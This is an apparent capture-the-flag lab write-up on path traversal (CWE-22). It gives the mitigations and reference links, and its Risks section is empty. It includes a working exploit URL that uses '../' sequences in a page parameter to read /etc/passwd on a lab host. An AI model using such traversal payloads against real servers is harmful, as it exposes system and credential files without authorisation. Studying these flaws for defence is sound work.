# Path traversal

## Breach type:

CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

## How to find the flag:
* use this url : http://192.168.56.101/index.php?page=../../../../../../../../etc/passwd

## Risks:


## How to avoid:
* Avoid User Input in File System Calls: Minimize the use of user input for file operations.
* Use Indexes: Instead of actual filenames, use indexes or predefined values.
* Restrict Path Construction: Surround user input with predefined path code to restrict path traversal.
* TO BE CONTINUED...

## Sources:
* https://cwe.mitre.org/data/definitions/22.html
* https://book.hacktricks.xyz/pentesting-web/file-inclusion
* https://owasp.org/www-community/attacks/Path_Traversal
* https://github.com/JahTheTrueGod/Directory-Traversal-Cheat-Sheet